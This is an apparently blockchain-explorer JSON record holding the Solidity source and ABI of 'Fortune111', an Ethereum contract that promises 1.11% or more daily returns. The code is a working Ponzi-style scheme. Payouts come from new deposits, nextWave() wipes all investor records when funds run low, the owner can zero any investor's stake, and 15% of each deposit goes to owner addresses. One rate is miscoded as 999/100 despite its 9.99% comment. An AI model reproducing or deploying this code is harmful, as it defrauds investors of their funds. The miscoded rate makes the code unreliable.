{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.4.25;\r\n\r\n/**\r\n*\r\n* Get your 1,11% every day profit with Fortune 111 Contract!\r\n* GitHub https://github.com/fortune333/fortune111\r\n* Site https://fortune333.online/\r\n*/\r\n\r\n\r\nlibrary Math {\r\nfunction min(uint a, uint b) internal pure returns(uint) {\r\nif (a > b) {\r\nreturn b;\r\n}\r\nreturn a;\r\n}\r\n}\r\n\r\n\r\nlibrary Zero {\r\nfunction requireNotZero(address addr) internal pure {\r\nrequire(addr != address(0), \"require not zero address\");\r\n}\r\n\r\nfunction requireNotZero(uint val) internal pure {\r\nrequire(val != 0, \"require not zero value\");\r\n}\r\n\r\nfunction notZero(address addr) internal pure returns(bool) {\r\nreturn !(addr == address(0));\r\n}\r\n\r\nfunction isZero(address addr) internal pure returns(bool) {\r\nreturn addr == address(0);\r\n}\r\n\r\nfunction isZero(uint a) internal pure returns(bool) {\r\nreturn a == 0;\r\n}\r\n\r\nfunction notZero(uint a) internal pure returns(bool) {\r\nreturn a != 0;\r\n}\r\n}\r\n\r\n\r\nlibrary Percent {\r\nstruct percent {\r\nuint num;\r\nuint den;\r\n}\r\n\r\nfunction mul(percent storage p, uint a) internal view returns (uint) {\r\nif (a == 0) {\r\nreturn 0;\r\n}\r\nreturn a*p.num/p.den;\r\n}\r\n\r\nfunction div(percent storage p, uint a) internal view returns (uint) {\r\nreturn a/p.num*p.den;\r\n}\r\n\r\nfunction sub(percent storage p, uint a) internal view returns (uint) {\r\nuint b = mul(p, a);\r\nif (b >= a) {\r\nreturn 0;\r\n}\r\nreturn a - b;\r\n}\r\n\r\nfunction add(percent storage p, uint a) internal view returns (uint) {\r\nreturn a + mul(p, a);\r\n}\r\n\r\nfunction toMemory(percent storage p) internal view returns (Percent.percent memory) {\r\nreturn Percent.percent(p.num, p.den);\r\n}\r\n\r\nfunction mmul(percent memory p, uint a) internal pure returns (uint) {\r\nif (a == 0) {\r\nreturn 0;\r\n}\r\nreturn a*p.num/p.den;\r\n}\r\n\r\nfunction mdiv(percent memory p, uint a) internal pure returns (uint) {\r\nreturn a/p.num*p.den;\r\n}\r\n\r\nfunction msub(percent memory p, uint a) internal pure returns (uint) {\r\nuint b = mmul(p, a);\r\nif (b >= a) {\r\nreturn 0;\r\n}\r\nreturn a - b;\r\n}\r\n\r\nfunction madd(percent memory p, uint a) internal pure returns (uint) {\r\nreturn a + mmul(p, a);\r\n}\r\n}\r\n\r\n\r\nlibrary Address {\r\nfunction toAddress(bytes source) internal pure returns(address addr) {\r\nassembly { addr := mload(add(source,0x14)) }\r\nreturn addr;\r\n}\r\n\r\nfunction isNotContract(address addr) internal view returns(bool) {\r\nuint length;\r\nassembly { length := extcodesize(addr) }\r\nreturn length == 0;\r\n}\r\n}\r\n\r\n\r\n/**\r\n* @title SafeMath\r\n* @dev Math operations with safety checks that revert on error\r\n*/\r\nlibrary SafeMath {\r\n\r\n/**\r\n* @dev Multiplies two numbers, reverts on overflow.\r\n*/\r\nfunction mul(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nif (_a == 0) {\r\nreturn 0;\r\n}\r\n\r\nuint256 c = _a * _b;\r\nrequire(c / _a == _b);\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\r\n*/\r\nfunction div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nrequire(_b > 0); // Solidity only automatically asserts when dividing by 0\r\nuint256 c = _a / _b;\r\n// assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\r\n*/\r\nfunction sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nrequire(_b <= _a);\r\nuint256 c = _a - _b;\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Adds two numbers, reverts on overflow.\r\n*/\r\nfunction add(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nuint256 c = _a + _b;\r\nrequire(c >= _a);\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Divides two numbers and returns the remainder (unsigned integer modulo),\r\n* reverts when dividing by zero.\r\n*/\r\nfunction mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\nrequire(b != 0);\r\nreturn a % b;\r\n}\r\n}\r\n\r\n\r\ncontract Accessibility {\r\naddress private owner;\r\nmodifier onlyOwner() {\r\nrequire(msg.sender == owner, \"access denied\");\r\n_;\r\n}\r\n\r\nconstructor() public {\r\nowner = msg.sender;\r\n}\r\n\r\nfunction disown() internal {\r\ndelete owner;\r\n}\r\n}\r\n\r\n\r\ncontract Rev1Storage {\r\nfunction investorShortInfo(address addr) public view returns(uint value, uint refBonus);\r\n}\r\n\r\n\r\ncontract Rev2Storage {\r\nfunction investorInfo(address addr) public view returns(uint investment, uint paymentTime);\r\n}\r\n\r\n\r\nlibrary PrivateEntrance {\r\nusing PrivateEntrance for privateEntrance;\r\nusing Math for uint;\r\nstruct privateEntrance {\r\nRev1Storage rev1Storage;\r\nRev2Storage rev2Storage;\r\nuint investorMaxInvestment;\r\nuint endTimestamp;\r\nmapping(address=>bool) hasAccess;\r\n}\r\n\r\nfunction isActive(privateEntrance storage pe) internal view returns(bool) {\r\nreturn pe.endTimestamp > now;\r\n}\r\n\r\nfunction maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {\r\nif (!pe.hasAccess[investorAddr]) {\r\nreturn 0;\r\n}\r\n\r\n(uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);\r\nif (maxInvestment == 0) {\r\nreturn 0;\r\n}\r\nmaxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);\r\n\r\n(uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);\r\n\r\nif (currInvestment >= maxInvestment) {\r\nreturn 0;\r\n}\r\n\r\nreturn maxInvestment-currInvestment;\r\n}\r\n\r\nfunction provideAccessFor(privateEntrance storage pe, address[] addrs) internal {\r\nfor (uint16 i; i < addrs.length; i++) {\r\npe.hasAccess[addrs[i]] = true;\r\n}\r\n}\r\n}\r\n\r\n\r\ncontract InvestorsStorage is Accessibility {\r\nstruct Investor {\r\nuint investment;\r\nuint paymentTime;\r\n}\r\nuint public size;\r\n\r\nmapping (address => Investor) private investors;\r\n\r\nfunction isInvestor(address addr) public view returns (bool) {\r\nreturn investors[addr].investment > 0;\r\n}\r\n\r\nfunction investorInfo(address addr) public view returns(uint investment, uint paymentTime) {\r\ninvestment = investors[addr].investment;\r\npaymentTime = investors[addr].paymentTime;\r\n}\r\n\r\nfunction newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {\r\nInvestor storage inv = investors[addr];\r\nif (inv.investment != 0 || investment == 0) {\r\nreturn false;\r\n}\r\ninv.investment = investment;\r\ninv.paymentTime = paymentTime;\r\nsize++;\r\nreturn true;\r\n}\r\n\r\nfunction addInvestment(address addr, uint investment) public onlyOwner returns (bool) {\r\nif (investors[addr].investment == 0) {\r\nreturn false;\r\n}\r\ninvestors[addr].investment += investment;\r\nreturn true;\r\n}\r\n\r\nfunction setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {\r\nif (investors[addr].investment == 0) {\r\nreturn false;\r\n}\r\ninvestors[addr].paymentTime = paymentTime;\r\nreturn true;\r\n}\r\n\r\nfunction disqalify(address addr) public onlyOwner returns (bool) {\r\nif (isInvestor(addr)) {\r\ninvestors[addr].investment = 0;\r\n}\r\n}\r\n}\r\n\r\n\r\nlibrary RapidGrowthProtection {\r\nusing RapidGrowthProtection for rapidGrowthProtection;\r\n\r\nstruct rapidGrowthProtection {\r\nuint startTimestamp;\r\nuint maxDailyTotalInvestment;\r\nuint8 activityDays;\r\nmapping(uint8 => uint) dailyTotalInvestment;\r\n}\r\n\r\nfunction maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {\r\nuint day = rgp.currDay();\r\nif (day == 0 || day > rgp.activityDays) {\r\nreturn 0;\r\n}\r\nif (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {\r\nreturn 0;\r\n}\r\nreturn rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];\r\n}\r\n\r\nfunction isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {\r\nuint day = rgp.currDay();\r\nreturn day != 0 && day <= rgp.activityDays;\r\n}\r\n\r\nfunction saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {\r\nuint day = rgp.currDay();\r\nif (day == 0 || day > rgp.activityDays) {\r\nreturn false;\r\n}\r\nif (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {\r\nreturn false;\r\n}\r\nrgp.dailyTotalInvestment[uint8(day)] += investment;\r\nreturn true;\r\n}\r\n\r\nfunction startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {\r\nrgp.startTimestamp = timestamp;\r\n\r\n// restart\r\nfor (uint8 i = 1; i <= rgp.activityDays; i++) {\r\nif (rgp.dailyTotalInvestment[i] != 0) {\r\ndelete rgp.dailyTotalInvestment[i];\r\n}\r\n}\r\n}\r\n\r\nfunction currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {\r\nif (rgp.startTimestamp > now) {\r\nreturn 0;\r\n}\r\nday = (now - rgp.startTimestamp) / 24 hours + 1;\r\n}\r\n}\r\n\r\ncontract Fortune111 is Accessibility {\r\nusing RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;\r\nusing PrivateEntrance for PrivateEntrance.privateEntrance;\r\nusing Percent for Percent.percent;\r\nusing SafeMath for uint;\r\nusing Math for uint;\r\n\r\n// easy read for investors\r\nusing Address for *;\r\nusing Zero for *;\r\n\r\nRapidGrowthProtection.rapidGrowthProtection private m_rgp;\r\nPrivateEntrance.privateEntrance private m_privEnter;\r\nmapping(address => bool) private m_referrals;\r\nInvestorsStorage private m_investors;\r\n\r\n// automatically generates getters\r\nuint public constant minInvesment = 10 finney;\r\nuint public constant maxBalance = 333e5 ether;\r\naddress public advertisingAddress;\r\naddress public adminsAddress;\r\nuint public investmentsNumber;\r\nuint public waveStartup;\r\n\r\n// percents\r\nPercent.percent private m_1_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%\r\nPercent.percent private m_5_percent = Percent.percent(555,10000);            // 555/10000 *100% = 5.55%\r\nPercent.percent private m_7_percent = Percent.percent(777,10000);            // 777/10000 *100% = 7.77%\r\nPercent.percent private m_8_percent = Percent.percent(888,10000);            // 888/10000 *100% = 8.88%\r\nPercent.percent private m_9_percent = Percent.percent(999,100);              // 999/10000 *100% = 9.99%\r\nPercent.percent private m_10_percent = Percent.percent(10,100);            // 10/100 *100% = 10%\r\nPercent.percent private m_11_percent = Percent.percent(11,100);            // 11/100 *100% = 11%\r\nPercent.percent private m_12_percent = Percent.percent(12,100);            // 12/100 *100% = 12%\r\nPercent.percent private m_referal_percent = Percent.percent(111,10000);        // 111/10000 *100% = 1.11%\r\nPercent.percent private m_referrer_percent = Percent.percent(111,10000);       // 111/10000 *100% = 1.11%\r\nPercent.percent private m_referrer_percentMax = Percent.percent(10,100);       // 10/100 *100% = 10%\r\nPercent.percent private m_adminsPercent = Percent.percent(5,100);          //  5/100 *100% = 5.0%\r\nPercent.percent private m_advertisingPercent = Percent.percent(10,100);    // 10/100 *100% = 10.0%\r\n\r\n// more events for easy read from blockchain\r\nevent LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);\r\nevent LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);\r\nevent LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);\r\nevent LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);\r\nevent LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);\r\nevent LogNewInvesment(address indexed addr, uint when, uint investment, uint value);\r\nevent LogAutomaticReinvest(address indexed addr, uint when, uint investment);\r\nevent LogPayDividends(address indexed addr, uint when, uint dividends);\r\nevent LogNewInvestor(address indexed addr, uint when);\r\nevent LogBalanceChanged(uint when, uint balance);\r\nevent LogNextWave(uint when);\r\nevent LogDisown(uint when);\r\n\r\n\r\nmodifier balanceChanged {\r\n_;\r\nemit LogBalanceChanged(now, address(this).balance);\r\n}\r\n\r\nmodifier notFromContract() {\r\nrequire(msg.sender.isNotContract(), \"only externally accounts\");\r\n_;\r\n}\r\n\r\nconstructor() public {\r\nadminsAddress = msg.sender;\r\nadvertisingAddress = msg.sender;\r\nnextWave();\r\n}\r\n\r\nfunction() public payable {\r\n// investor get him dividends\r\nif (msg.value.isZero()) {\r\ngetMyDividends();\r\nreturn;\r\n}\r\n\r\n// sender do invest\r\ndoInvest(msg.data.toAddress());\r\n}\r\n\r\nfunction disqualifyAddress(address addr) public onlyOwner {\r\nm_investors.disqalify(addr);\r\n}\r\n\r\nfunction doDisown() public onlyOwner {\r\ndisown();\r\nemit LogDisown(now);\r\n}\r\n\r\nfunction init(address rev1StorageAddr, uint timestamp) public onlyOwner {\r\n// init Rapid Growth Protection\r\nm_rgp.startTimestamp = timestamp + 1;\r\nm_rgp.maxDailyTotalInvestment = 500 ether;\r\nm_rgp.activityDays = 21;\r\nemit LogRGPInit(\r\nnow,\r\nm_rgp.startTimestamp,\r\nm_rgp.maxDailyTotalInvestment,\r\nm_rgp.activityDays\r\n);\r\n\r\n\r\n// init Private Entrance\r\nm_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);\r\nm_privEnter.rev2Storage = Rev2Storage(address(m_investors));\r\nm_privEnter.investorMaxInvestment = 50 ether;\r\nm_privEnter.endTimestamp = timestamp;\r\nemit LogPEInit(\r\nnow,\r\naddress(m_privEnter.rev1Storage),\r\naddress(m_privEnter.rev2Storage),\r\nm_privEnter.investorMaxInvestment,\r\nm_privEnter.endTimestamp\r\n);\r\n}\r\n\r\nfunction setAdvertisingAddress(address addr) public onlyOwner {\r\naddr.requireNotZero();\r\nadvertisingAddress = addr;\r\n}\r\n\r\nfunction setAdminsAddress(address addr) public onlyOwner {\r\naddr.requireNotZero();\r\nadminsAddress = addr;\r\n}\r\n\r\nfunction privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {\r\nm_privEnter.provideAccessFor(addrs);\r\n}\r\n\r\nfunction rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {\r\ninvestment = m_rgp.maxInvestmentAtNow();\r\n}\r\n\r\nfunction investorsNumber() public view returns(uint) {\r\nreturn m_investors.size();\r\n}\r\n\r\nfunction balanceETH() public view returns(uint) {\r\nreturn address(this).balance;\r\n}\r\n\r\nfunction advertisingPercent() public view returns(uint numerator, uint denominator) {\r\n(numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);\r\n}\r\n\r\nfunction adminsPercent() public view returns(uint numerator, uint denominator) {\r\n(numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);\r\n}\r\n\r\nfunction investorInfo(address investorAddr) public view returns(uint investment, uint paymentTime, bool isReferral) {\r\n(investment, paymentTime) = m_investors.investorInfo(investorAddr);\r\nisReferral = m_referrals[investorAddr];\r\n}\r\n\r\nfunction investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {\r\ndividends = calcDividends(investorAddr);\r\n}\r\n\r\nfunction dailyPercentAtNow() public view returns(uint numerator, uint denominator) {\r\nPercent.percent memory p = dailyPercent();\r\n(numerator, denominator) = (p.num, p.den);\r\n}\r\n\r\nfunction getMyDividends() public notFromContract balanceChanged {\r\n// calculate dividends\r\n\r\n//check if 1 day passed after last payment\r\nrequire(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);\r\n\r\nuint dividends = calcDividends(msg.sender);\r\nrequire (dividends.notZero(), \"cannot to pay zero dividends\");\r\n\r\n// update investor payment timestamp\r\nassert(m_investors.setPaymentTime(msg.sender, now));\r\n\r\n// check enough eth - goto next wave if needed\r\nif (address(this).balance <= dividends) {\r\nnextWave();\r\ndividends = address(this).balance;\r\n}\r\n\r\n// transfer dividends to investor\r\nmsg.sender.transfer(dividends);\r\nemit LogPayDividends(msg.sender, now, dividends);\r\n}\r\n\r\nfunction doInvest(address referrerAddr) public payable notFromContract balanceChanged {\r\nuint investment = msg.value;\r\nuint receivedEther = msg.value;\r\nrequire(investment >= minInvesment, \"investment must be >= minInvesment\");\r\nrequire(address(this).balance <= maxBalance, \"the contract eth balance limit\");\r\n\r\nif (m_rgp.isActive()) {\r\n// use Rapid Growth Protection if needed\r\nuint rpgMaxInvest = m_rgp.maxInvestmentAtNow();\r\nrpgMaxInvest.requireNotZero();\r\ninvestment = Math.min(investment, rpgMaxInvest);\r\nassert(m_rgp.saveInvestment(investment));\r\nemit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());\r\n\r\n} else if (m_privEnter.isActive()) {\r\n// use Private Entrance if needed\r\nuint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);\r\npeMaxInvest.requireNotZero();\r\ninvestment = Math.min(investment, peMaxInvest);\r\n}\r\n\r\n// send excess of ether if needed\r\nif (receivedEther > investment) {\r\nuint excess = receivedEther - investment;\r\nmsg.sender.transfer(excess);\r\nreceivedEther = investment;\r\nemit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);\r\n}\r\n\r\n// commission\r\nadvertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));\r\nadminsAddress.transfer(m_adminsPercent.mul(receivedEther));\r\n\r\nbool senderIsInvestor = m_investors.isInvestor(msg.sender);\r\n\r\n// ref system works only once and only on first invest\r\nif (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&\r\nreferrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {\r\n\r\nm_referrals[msg.sender] = true;\r\n// add referral bonus to investor`s and referral`s investments\r\nuint referrerBonus = m_referrer_percent.mmul(investment);\r\nif (investment > 10 ether) {\r\nreferrerBonus = m_referrer_percentMax.mmul(investment);\r\n}\r\n\r\nuint referalBonus = m_referal_percent.mmul(investment);\r\nassert(m_investors.addInvestment(referrerAddr, referrerBonus)); // add referrer bonus\r\ninvestment += referalBonus;                                    // add referral bonus\r\nemit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);\r\n}\r\n\r\n// automatic reinvest - prevent burning dividends\r\nuint dividends = calcDividends(msg.sender);\r\nif (senderIsInvestor && dividends.notZero()) {\r\ninvestment += dividends;\r\nemit LogAutomaticReinvest(msg.sender, now, dividends);\r\n}\r\n\r\nif (senderIsInvestor) {\r\n// update existing investor\r\nassert(m_investors.addInvestment(msg.sender, investment));\r\nassert(m_investors.setPaymentTime(msg.sender, now));\r\n} else {\r\n// create new investor\r\nassert(m_investors.newInvestor(msg.sender, investment, now));\r\nemit LogNewInvestor(msg.sender, now);\r\n}\r\n\r\ninvestmentsNumber++;\r\nemit LogNewInvesment(msg.sender, now, investment, receivedEther);\r\n}\r\n\r\nfunction getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {\r\n(uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);\r\nreturn InvestorsStorage.Investor(investment, paymentTime);\r\n}\r\n\r\nfunction calcDividends(address investorAddr) internal view returns(uint dividends) {\r\nInvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);\r\n\r\n// safe gas if dividends will be 0\r\nif (investor.investment.isZero() || now.sub(investor.paymentTime) < 10 minutes) {\r\nreturn 0;\r\n}\r\n\r\n// for prevent burning daily dividends if 24h did not pass - calculate it per 10 min interval\r\nPercent.percent memory p = dailyPercent();\r\ndividends = (now.sub(investor.paymentTime) / 10 minutes) * p.mmul(investor.investment) / 144;\r\n}\r\n\r\nfunction dailyPercent() internal view returns(Percent.percent memory p) {\r\nuint balance = address(this).balance;\r\n\r\nif (balance < 500 ether) {\r\np = m_1_percent.toMemory();\r\n} else if ( 500 ether <= balance && balance <= 1500 ether) {\r\np = m_5_percent.toMemory();\r\n} else if ( 1500 ether <= balance && balance <= 5000 ether) {\r\np = m_7_percent.toMemory();\r\n} else if ( 5000 ether <= balance && balance <= 10000 ether) {\r\np = m_8_percent.toMemory();\r\n} else if ( 10000 ether <= balance && balance <= 20000 ether) {\r\np = m_9_percent.toMemory();\r\n} else if ( 20000 ether <= balance && balance <= 30000 ether) {\r\np = m_10_percent.toMemory();\r\n} else if ( 30000 ether <= balance && balance <= 50000 ether) {\r\np = m_11_percent.toMemory();\r\n} else {\r\np = m_12_percent.toMemory();\r\n}\r\n}\r\n\r\nfunction nextWave() private {\r\nm_investors = new InvestorsStorage();\r\ninvestmentsNumber = 0;\r\nwaveStartup = now;\r\nm_rgp.startAt(now);\r\nemit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);\r\nemit LogNextWave(now);\r\n}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"addrs\",\"type\":\"address[]\"}],\"name\":\"privateEntranceProvideAccessFor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"disqualifyAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"advertisingAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"rev1StorageAddr\",\"type\":\"address\"},{\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"init\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minInvesment\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"adminsAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investorsNumber\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"maxBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddr\",\"type\":\"address\"}],\"name\":\"investorDividendsAtNow\",\"outputs\":[{\"name\":\"dividends\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"rapidGrowthProtectionmMaxInvestmentAtNow\",\"outputs\":[{\"name\":\"investment\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"advertisingPercent\",\"outputs\":[{\"name\":\"numerator\",\"type\":\"uint256\"},{\"name\":\"denominator\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"adminsPercent\",\"outputs\":[{\"name\":\"numerator\",\"type\":\"uint256\"},{\"name\":\"denominator\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setAdminsAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investmentsNumber\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dailyPercentAtNow\",\"outputs\":[{\"name\":\"numerator\",\"type\":\"uint256\"},{\"name\":\"denominator\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setAdvertisingAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getMyDividends\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"referrerAddr\",\"type\":\"address\"}],\"name\":\"doInvest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"investorAddr\",\"type\":\"address\"}],\"name\":\"investorInfo\",\"outputs\":[{\"name\":\"investment\",\"type\":\"uint256\"},{\"name\":\"paymentTime\",\"type\":\"uint256\"},{\"name\":\"isReferral\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"waveStartup\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"balanceETH\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"doDisown\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"rev1Storage\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"rev2Storage\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"investorMaxInvestment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"endTimestamp\",\"type\":\"uint256\"}],\"name\":\"LogPEInit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"excess\",\"type\":\"uint256\"}],\"name\":\"LogSendExcessOfEther\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"referrerAddr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"refBonus\",\"type\":\"uint256\"}],\"name\":\"LogNewReferral\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"startTimestamp\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"maxDailyTotalInvestment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"activityDays\",\"type\":\"uint256\"}],\"name\":\"LogRGPInit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"day\",\"type\":\"uint256\"}],\"name\":\"LogRGPInvestment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"LogNewInvesment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"investment\",\"type\":\"uint256\"}],\"name\":\"LogAutomaticReinvest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"dividends\",\"type\":\"uint256\"}],\"name\":\"LogPayDividends\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"}],\"name\":\"LogNewInvestor\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"LogBalanceChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"}],\"name\":\"LogNextWave\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"when\",\"type\":\"uint256\"}],\"name\":\"LogDisown\",\"type\":\"event\"}]","ContractName":"Fortune111","CompilerVersion":"v0.4.25+commit.59dbf8f1","O